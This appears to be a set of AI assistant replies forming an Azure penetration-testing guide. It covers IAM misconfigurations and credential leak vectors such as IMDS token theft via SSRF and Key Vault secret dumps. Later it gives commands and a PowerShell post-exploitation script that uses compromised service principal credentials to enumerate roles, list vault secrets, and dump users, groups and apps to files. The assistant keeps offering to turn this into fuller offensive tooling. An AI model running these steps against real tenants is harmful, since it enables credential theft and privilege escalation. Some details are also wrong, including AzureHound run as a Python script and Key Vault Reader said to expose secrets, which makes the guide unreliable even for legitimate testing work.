# Azure IAM Misconfigurations

**Identity, Access, Credential, and Privileged Account Management
Failures**

**Context (Azure PenTest)**

Insecure identity and access management (IAM) in Azure exposes
environments to significant risks. Attackers frequently target weak
access controls, overprivileged roles, improperly managed credentials,
and poorly maintained keys to escalate privileges and persist in a cloud
environment.

**Common Misconfigurations**

| **Category** | **Misconfiguration** | **Impact** |
|----|----|----|
| **Identity** | Excessive role assignments (e.g., Owner, Contributor to regular users or apps) | Privilege escalation, lateral movement |
| **Credentials** | Hardcoded secrets in scripts, function apps, or VM extensions | Credential theft, persistence |
| **Access Control** | Lack of role-based scoping and Just-in-Time (JIT) access | Long-term exposure to sensitive resources |
| **Privileged Accounts** | Inactive or unmonitored Global Admins or Key Vault Admins | High risk of post-exploitation |
| **Key Management** | Unrotated or mismanaged secrets in Azure Key Vault | Unauthorized data access |

**Offensive Opportunities in a Red Team / Pentest:**

- **Enumerate and exploit over-permissioned roles** using:

  - az role assignment list

  - AzureHound / BloodHound for Azure

- **Extract secrets** from:

  - Key Vaults with list, get, or purge permissions

  - VM extensions (e.g., CustomScriptExtension)

- **Target stale or shadow admin accounts** that are still assigned high
  privileges

- **Pivot through managed identities** attached to services (e.g., App
  Services, VMs) with excessive RBAC or AzureAD app roles

**Key Principles for Azure IAM Security**

| **Principle** | **PenTest Focus** |
|----|----|
| **Least Privilege** | Validate and exploit role sprawl in IAM -\> Role Assignments |
| **Separation of Duties** | Check for privilege aggregation across accounts |
| **Zero Trust** | Test for implicit trust relationships, unmanaged access paths |
| **Risk-Based Scoring** | Identify high-risk users with frequent sensitive access patterns |

**Real-World Examples**

1.  **CapitalOne (2019)** – AWS-based breach using EC2 instance with an
    overprivileged IAM role. Azure analog: VMs with Managed Identity and
    high-privilege access (e.g., Contributor to Subscription).

2.  **SEGA Europe (2021)** – Cloud credentials exposed via public
    buckets and hardcoded values. In Azure, this is analogous to
    Function App config leaks or Storage Account exposure.

3.  **Twitch, Twilio, and others (2021)** – Insider abuse of privileged
    access. In Azure, inactive or orphaned admin accounts often go
    unnoticed and can be used for post-exploitation access.

**💡 Best Practices (Blue Team Focus)**

- Enforce **JIT access** with Azure Privileged Identity Management (PIM)

- Regularly **review role assignments** and remove stale or unused
  accounts

- Use **Azure Key Vault with RBAC + auditing**

- Monitor high-impact permissions
  (Microsoft.Authorization/roleAssignments/\*,
  Microsoft.KeyVault/\*/secrets/\*)

- Implement **CIEM (Cloud Infrastructure Entitlement Management)**
  tooling for continuous access evaluation

**⚠️ Business Impact of Poor IAM Hygiene**

- Data loss or ransomware due to unauthorized access

- Cloud service disruption from insider or lateral attacks

- Legal/regulatory impact (e.g., GDPR, HIPAA violations)

- Incident response and forensic costs

- Reputation damage from breach disclosure

Would you like a corresponding checklist or attack path diagram for
Azure IAM abuse?

# Azure Identity & Secrets (PenTest-Oriented)

Unlike AWS, Azure does not use prefix-based identifiers for identities.
Instead, identities and secrets are associated with structured objects
in Azure Active Directory (Azure AD), Azure Resource Manager (ARM), and
Key Vault.

**Common Azure Identity Types & What to Look For**

| **Type** | **Azure Term** | **ID Format / Example** | **Use / Pentest Relevance** |
|----|----|----|----|
| **User** | Azure AD User | [<u>GUID / UPN (user@domain.com)</u>](mailto:user@domain.com) | Lateral movement, role assignments |
| **Group** | Azure AD Group | GUID | Privilege enumeration, nested group abuse |
| **Application** | App Registration / Enterprise App | App ID (Client ID) = GUID | Service principals, OAuth token abuse |
| **Service Principal** | Identity backing an app | Object ID / App ID | Target for password/symmetric key abuse |
| **Managed Identity** | System/ User-assigned Managed Identity | Object ID / Resource ID | Used by Azure resources to access other services securely |
| **Role Assignment** | Role Definition + Principal + Scope | JSON Structure | Enumerate to discover overprivileged identities |
| **Tenant** | Azure AD Tenant | GUID | Required for many MS Graph & Azure API calls |
| **Subscription** | Azure Subscription | GUID | Scope identifier; used in API calls |
| **Access Key (Storage)** | Shared Access Keys (base64) | 88-char Base64 strings | Storage exploitation, lateral movement |
| **Shared Access Signature (SAS)** | Temporary token for storage access | URL Token (signed with access key) | Exfiltration, misconfig abuse |
| **Client Secret** | App Secret (like password for apps) | GUID or base64 string | Post-exploitation: access APIs or impersonate apps |
| **Certificate** | Used by app registration / key credentials | PEM / PFX | App authentication via cert-based login |

**High-Value Tokens / Secrets to Identify in PenTest**

| **Item** | **How It’s Found** | **Use Case** |
|----|----|----|
| **AZURE_CLIENT_ID** | Env var / code / web.config | OAuth flows, app impersonation |
| **AZURE_CLIENT_SECRET** | Config files / repos / Key Vault dumps | Access token generation |
| **AZURE_TENANT_ID** | Public / MS Graph / response headers | Required for token requests |
| **AZURE_SUBSCRIPTION_ID** | Code / CLI / environment | Scope operations |
| **Azure Key Vault Secrets** | Retrieved via API, CLI, or SSRF | Stealing DB creds, API keys, secrets |
| **Storage Account Keys** | Via RBAC, KeyVault, or leaked configs | Full access to blob, file, table, and queue |
| **SAS Tokens** | Captured from URLs or logs | Temporary read/write access to storage |

**Example Post-Exploitation Use**

**Enumerate app identities**:

- az ad app list --query "\[\].{appId:appId, displayName:displayName}"
  --all

**Extract secrets from Key Vault**:

- az keyvault secret list --vault-name \<name\>

- az keyvault secret show --vault-name \<name\> --name \<secret\>

# Azure API Calls / Operations That May Expose Credentials or Tokens 

These Azure operations can return **sensitive credentials**,
**secrets**, or **access tokens** if misconfigured or abused during
post-exploitation:

## Azure Resource Management (ARM) & Identity

- **Managed Identity Token Retrieval**

  - Abuse of [Azure Instance Metadata Service
    (IMDS)](http://169.254.169.254/metadata/identity/oauth2/token) to
    extract access tokens for Managed Identities.

  - Often via SSRF, RCE, or open proxy.

- **Azure AD OAuth2 Token Leaks**

  - APIs using oauth2/token endpoints can return access_token when
    scoped with correct resource (e.g., https://management.azure.com/).

- **Service Principal Credential Dumping**

  - If compromised or misconfigured, secrets for SPNs can be pulled from
    Key Vaults or environment variables.

**🔐 Identity & Access**

- **Azure AD SSO Token Extraction**

  - If browser sessions or token caches (e.g., MSAL/ADAL) are accessible
    via local compromise.

- **Privileged Role Assignment via Microsoft Graph API**

  - Abuse of RoleAssignmentScheduleRequests to assign roles and generate
    access.

- **Azure AD Token Replay via sts/tokenorassertion injection**

  - Leverage access_token, id_token, or refresh_token leaks for session
    hijack.

**💾 Secrets & Credential Services**

- **Azure Key Vault: GetSecret / ListSecrets**

  - Leaks API keys, passwords, or connection strings.

  - Requires Secret Reader role or misconfigured access policies.

- **Azure Automation Account Credential Access**

  - Dump credentials stored in Automation Runbooks or Variables.

- **Azure App Service AppSettings Dump**

  - Environment variables may contain connection strings and
    credentials.

**📦 Containers & Compute**

- **Azure Container Instances / AKS Env Leak**

  - Environment variables may hold credentials (e.g.,
    AZURE_CLIENT_SECRET).

- **Function Apps / Logic Apps**

  - May expose credentials or hardcoded secrets in source or via
    /admin/token.

**🧪 Other Abuse Vectors**

- **Azure DevOps PAT Leakage**

  - Abuse pipeline variables or endpoints to dump Personal Access
    Tokens.

- **Storage Account Shared Access Signature (SAS) Tokens**

  - Misconfigured SAS URLs can expose sensitive blobs or file shares.

- **Azure SQL or Cosmos DB with leaked connection strings**

  - Abuse cleartext creds in config or key vault.

# Azure Credential Leak Vectors

Pentest Reference Table

| **Attack Vector** | **API/Service or Method** | **Required Access / Misconfig** | **What You Can Extract** |
|----|----|----|----|
| **IMDS Token Abuse** | http://169.254.169.254/metadata/identity/oauth2/token | SSRF / RCE on VM / container | Managed Identity access tokens |
| **Key Vault Secrets Dump** | GET /secrets/{secret-name} via Azure Key Vault API | Key Vault Reader / misconfigured access | Credentials, API keys, secrets |
| **App Service AppSettings Dump** | Kudu / SCM or ARM API (/config/appsettings/list) | Contributor / Reader on App Service | Environment vars with credentials |
| **Automation Account Variable Dump** | ARM API / Runbook access (/variables, /credentials) | Contributor / Automation Operator | Stored credentials, passwords |
| **Azure Function Admin Token Dump** | https://\<func\>.azurewebsites.net/admin/token | Access to Function App | Admin bearer token (can invoke functions) |
| **Azure DevOps PAT Token Extraction** | Pipeline variable dump or REST API (/personalaccesstokens) | Pipeline access or contributor | PATs scoped to Azure DevOps resources |
| **Container Instance Env Leak** | docker inspect, /proc/self/environ, or API metadata | Access to container / API | Environment secrets, SPN secrets |
| **Logic App Credential Disclosure** | View Logic App JSON definition in portal or via ARM | Reader / Contributor | Embedded creds (SMTP, API keys, etc.) |
| **Azure SQL / Cosmos DB Connection Strings** | GET /config/connectionstrings or AppSettings | Contributor / Reader | Cleartext connection strings |
| **SAS Token Exposure** | URLs with ?sig= in Blob/File/Table/Queue storage | Public sharing or misconfig | Full/partial access to storage resources |
| **Service Principal Secrets from Config** | Hardcoded in code, AppSettings, or accessible logs | File access or source control | AZURE_CLIENT_ID, AZURE_CLIENT_SECRET |
| **AAD Token Replay / Session Hijack** | Access tokens found in logs, memory, or browser cache | Local compromise / token leak | Replay into Microsoft Graph or ARM API |
| **Role Elevation via Microsoft Graph API** | RoleAssignmentScheduleRequests, PrivilegedRoleAssignmentRequests | Privileged access | Assign self privileged roles (e.g., Global Admin) |
| **Azure AD OAuth2 Abuse** | POST /oauth2/token with client credentials | Known SPN creds or misconfigured apps | Access tokens for Azure services |

# Enumerate Azure IAM Permissions from Compromised Credentials

When conducting a penetration test in Azure, it's critical to enumerate
the permissions associated with a compromised Azure AD credential set
(client ID, client secret, tenant ID). This helps identify potential
privilege escalation paths, accessible services, or sensitive actions
the account can perform.

**Tool Recommendation:
[MICROSOFT-AZURE-AD-PERMISSIONS-ENUMERATOR](https://github.com/NetSPI/MicroBurst)**

For Azure, NetSPI’s
[**MicroBurst**](https://github.com/NetSPI/MicroBurst) or
[**AzureHound**](https://github.com/BloodHoundAD/AzureHound) can be used
to enumerate effective permissions.

------------------------------------------------------------------------

**Example with MicroBurst's Get-AzDomainInfo and Get-AzPasswords**

\# Clone the repo

git clone https://github.com/NetSPI/MicroBurst.git

cd MicroBurst

\# Set environment variables or provide creds in the command

Import-Module .\MicroBurst.psm1

\# Example: Connect with service principal creds

\$creds = New-Object System.Management.Automation.PSCredential
("\<client-id\>", (ConvertTo-SecureString "\<client-secret\>"
-AsPlainText -Force))

Connect-AzAccount -ServicePrincipal -Credential \$creds -Tenant
"\<tenant-id\>"

\# Enumerate key permissions

Get-AzDomainInfo

Invoke-EnumerateAzureSubDomains

Get-AzPasswords

Invoke-EnumerateAzureBlobs

------------------------------------------------------------------------

**Example Output (Abbreviated)**

\[\*\] Successfully authenticated to Azure AD

\[\*\] Enumerating Azure domain info...

\[+\] Domain: contoso.onmicrosoft.com

\[\*\] Checking for key vault access...

\[+\] List of accessible KeyVaults:

\- kv-backingstore

\[\*\] Found permission to list blobs on storage account 'backups001'

\[\*\] Found AppRole assignment: Contributor on subscription xyz-123-abc

------------------------------------------------------------------------

**Key Actions to Look For**

- **Get-AzRoleAssignment** → View role assignments

- **Get-AzKeyVaultSecret** → Access secrets (if permissions allow)

- **List Storage Containers / Blobs**

- **List App Registrations** → Potential lateral movement

- **Enumerate SPNs / Roles / Groups**

------------------------------------------------------------------------

**Goal**

Determine what the compromised account *can do*, such as:

- Read secrets from Key Vault

- Dump storage account contents

- Escalate privileges via Contributor roles

- Enumerate Azure AD users and groups

------------------------------------------------------------------------

Would you like a step-by-step command sequence for full Azure
enumeration using service principal creds?

Great — here’s a **step-by-step guide** for enumerating permissions and
assets in Azure after compromising a **Service Principal (SP)**
credential set, which includes:

- **Client ID**

- **Client Secret**

- **Tenant ID**

We’ll use **MicroBurst**, **Azure PowerShell**, and **Az CLI** to cover
various vectors of enumeration.

------------------------------------------------------------------------

**🛠️ Setup**

**1. Install Azure PowerShell**

Install-Module -Name Az -AllowClobber -Scope CurrentUser

**2. Install MicroBurst**

git clone https://github.com/NetSPI/MicroBurst.git

cd MicroBurst

------------------------------------------------------------------------

**🔐 Authenticate with SP Credentials**

\$clientId = "\<client-id\>"

\$clientSecret = "\<client-secret\>"

\$tenantId = "\<tenant-id\>"

\$secureSecret = ConvertTo-SecureString \$clientSecret -AsPlainText
-Force

\$creds = New-Object
System.Management.Automation.PSCredential(\$clientId, \$secureSecret)

Connect-AzAccount -ServicePrincipal -Credential \$creds -Tenant
\$tenantId

------------------------------------------------------------------------

**🕵️ Enumeration Steps (PowerShell)**

**3. Import MicroBurst**

Import-Module .\MicroBurst\MicroBurst.psm1

**4. List Subscriptions**

Get-AzSubscription

🔄 Use Set-AzContext -Subscription \<id\> to change context if needed.

------------------------------------------------------------------------

**Core Enumeration Tasks**

**5. Enumerate Roles and Access**

Get-AzRoleAssignment

Get-AzRoleDefinition

**6. Find Key Vaults and Secrets**

Get-AzKeyVault \# List accessible vaults

Get-AzKeyVaultSecret -VaultName \<name\> \# Dump secrets (if allowed)

**7. Enumerate Storage Accounts & Files**

Get-AzStorageAccount

Invoke-EnumerateAzureBlobs -Verbose \# From MicroBurst

**8. Enumerate App Registrations / Service Principals**

Get-AzADApplication

Get-AzADServicePrincipal

**9. Enumerate Users and Groups**

Get-AzADUser

Get-AzADGroup

------------------------------------------------------------------------

**Advanced/Optional Enumeration**

- Invoke-EnumerateAzureSubDomains — Enum external assets via DNS

- Invoke-EnumerateAzureRM — All-in-one enumeration script

- AzureHound — Collects Azure AD data for BloodHound analysis (great for
  privilege escalation paths)

------------------------------------------------------------------------

**📦 Az CLI Alternative (Linux-Compatible)**

az login --service-principal -u \<client-id\> -p \<client-secret\>
--tenant \<tenant-id\>

az account list

az role assignment list

az keyvault list

az keyvault secret list --vault-name \<vault\>

az storage account list

------------------------------------------------------------------------

Let me know if you want to script this into an automated
post-exploitation module or integrate with BloodHound/AzureHound.

Perfect. Below is a **modular PowerShell script** to automate Azure
post-exploitation tasks using compromised Service Principal credentials.
It includes:

- SPN authentication

- Core enumeration

- Optional AzureHound data collection

------------------------------------------------------------------------

**🧰 Azure Post-Exploitation Script (PowerShell)**

\# Azure-SPN-Enum.ps1

param (

\[Parameter(Mandatory=\$true)\]\[string\]\$ClientId,

\[Parameter(Mandatory=\$true)\]\[string\]\$ClientSecret,

\[Parameter(Mandatory=\$true)\]\[string\]\$TenantId

)

\# Convert client secret to secure string

\$secureSecret = ConvertTo-SecureString \$ClientSecret -AsPlainText
-Force

\$creds = New-Object
System.Management.Automation.PSCredential(\$ClientId, \$secureSecret)

\# Connect to Azure

Write-Host "\`n\[+\] Authenticating as Service Principal..."

Connect-AzAccount -ServicePrincipal -Credential \$creds -Tenant
\$TenantId \| Out-Null

\# List Subscriptions

Write-Host "\[+\] Enumerating subscriptions..."

Get-AzSubscription \| Tee-Object -FilePath "subscriptions.txt"

\# Set active subscription

\$subs = Get-AzSubscription

foreach (\$sub in \$subs) {

Write-Host "\`n\[\>\] Switching to Subscription: \$(\$sub.Name)"

Set-AzContext -SubscriptionId \$sub.Id \| Out-Null

\# Role Assignments

Write-Host "\[\*\] Roles and permissions..."

Get-AzRoleAssignment \| Tee-Object -FilePath "roles\_\$(\$sub.Name).txt"

\# Key Vaults & Secrets

Write-Host "\[\*\] Key Vault secrets (if accessible)..."

Get-AzKeyVault \| ForEach-Object {

try {

Get-AzKeyVaultSecret -VaultName \$\_.VaultName \| Tee-Object -FilePath
"kv\_\$(\$\_.VaultName).txt"

} catch {

Write-Warning "Access denied to vault: \$(\$\_.VaultName)"

}

}

\# Storage

Write-Host "\[\*\] Storage accounts..."

Get-AzStorageAccount \| Tee-Object -FilePath
"storage\_\$(\$sub.Name).txt"

\# Azure AD Users and Groups

Write-Host "\[\*\] Azure AD enumeration..."

Get-AzADUser \| Tee-Object -FilePath "users\_\$(\$sub.Name).txt"

Get-AzADGroup \| Tee-Object -FilePath "groups\_\$(\$sub.Name).txt"

\# App Registrations

Write-Host "\[\*\] App registrations..."

Get-AzADApplication \| Tee-Object -FilePath "apps\_\$(\$sub.Name).txt"

}

Write-Host "\`n\[+\] Enumeration complete. Logs saved in current
directory."

------------------------------------------------------------------------

**🧭 Optional: Collect AzureHound Data**

Install and run [AzureHound](https://github.com/BloodHoundAD/AzureHound)
from a Linux host:

\# Install dependencies (Python 3.8+, pip)

pip install -r requirements.txt

\# Collect data with SP creds

python3 AzureHound.py azure --client-id \<id\> --client-secret
\<secret\> --tenant-id \<id\> --output-file azure.zip

Upload azure.zip to BloodHound GUI for graph-based privilege escalation
analysis.

------------------------------------------------------------------------

Would you like this wrapped into a full tool with menus and logging
(e.g., as a PowerShell module or a cross-platform Python version)?
